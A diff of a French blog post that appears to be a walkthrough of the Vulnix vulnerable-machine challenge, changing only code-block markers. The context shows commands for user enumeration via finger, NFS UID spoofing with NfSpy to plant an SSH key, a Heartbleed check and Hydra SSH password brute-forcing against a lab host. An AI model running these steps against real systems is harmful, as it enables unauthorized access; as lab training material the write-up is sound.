@@ -15,7 +15,7 @@ Les années 90 ont appelées, elles veulent récupérer leurs services
 
 finger, NFS, rsh, rexec, rlogin ça ne vous dit rien ? Mais si, rappellez-vous cet affreux tonton barbu, ex-administrateur système, qui voulait vous faire installer une *Slackware* (le salaud !) et vous parlait de Gnous (wtf !?)  
 
-```plain
+```
 Starting Nmap 6.46 ( http://nmap.org ) at 2014-07-02 21:30 CEST
 Nmap scan report for 192.168.1.54
 Host is up (0.00025s latency).
@@ -144,7 +144,7 @@ Back to the future
 
 Le service *finger* permet d'obtenir des informations sur les utilisateurs et donc potentiellement de les énumérer. Bref du vintage.  
 
-```plain
+```
 $ finger user@192.168.1.54
 Login: user                             Name: user
 Directory: /home/user                   Shell: /bin/bash
@@ -166,7 +166,7 @@ Le problème de ce service est que l'authentification se fait sur le user ID de 
 
 On peut obtenir les partages exportés via showmount :  
 
-```plain
+```
 # showmount -e 192.168.1.54
 Export list for 192.168.1.54:
 /home/vulnix *
@@ -174,7 +174,7 @@ Export list for 192.168.1.54:
 
 L'outil de référence pour exploiter du NSF est [Nfspy](https://github.com/bonsaiviking/NfSpy). Il se charge automatiquement de mentir sur les IDs de l'utilisateur. J'uploade ici un fichier *authorized\_keys* qui me permettra de me connecter ensuite avec ma clé SSH :  
 
-```plain
+```
 # PYTHONPATH=. ./scripts/nfspysh -o server=192.168.1.54:/home/vulnix
 nfspy@192.168.1.54:/home/vulnix:/> ls
 /:
@@ -195,7 +195,7 @@ nfspy@192.168.1.54:/home/vulnix:/.ssh> exit
 Quitting.
 ```
 
-```plain
+```
 $ ssh vulnix@192.168.1.54
 Enter passphrase for key '/home/devloop/.ssh/id_rsa': 
 Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)
@@ -236,7 +236,7 @@ L'éditeur prédéfini sur le système est nano (beurk). Il est possible de fair
 
 L'attaque attendue dans le challenge consiste normalement à modifier la ligne suivant du */etc/exports* :  
 
-```plain
+```
 /home/vulnix    *(rw,root_squash)
 ```
 
@@ -249,7 +249,7 @@ Les années 2010 sont arrivées sans prévenir
 
 Chose amusante : les ports *Dovecot* 993 et 995 sont vulnérables à *Heartbleed* (testé avec *hb-test.py* de *Jared Stafford*) mais il ne faut pas espérer quelque chose d'intéressant.  
 
-```plain
+```
 $ python hb-test.py 192.168.1.54 -p 995
 Connecting...
 Sending Client Hello...
@@ -281,7 +281,7 @@ Ajouté à ça l'utilisateur *"user"* a un mot de passe facilement cassable.
 
 Ici j'ai utilisé *Hydra* avec une wordlist pompée [chez SkullSecurity](https://wiki.skullsecurity.org/Passwords) contenant les mots de passe les plus fréquents (dans l'ordre !)  
 
-```plain
+```
 $ ./hydra -l user -P phpbb.txt  -e nsr ssh://192.168.1.54
 Hydra v8.0 (c) 2014 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes.
 
@@ -297,7 +297,7 @@ Hydra (http://www.thc.org/thc-hydra) finished at 2014-07-03 19:07:33
 
 Une fois connecté avec SSH :  
 
-```plain
+```
 user@vulnix:~$ id
 uid=1000(user) gid=1000(user) groups=1000(user),100(users)
 user@vulnix:~$ ls -al
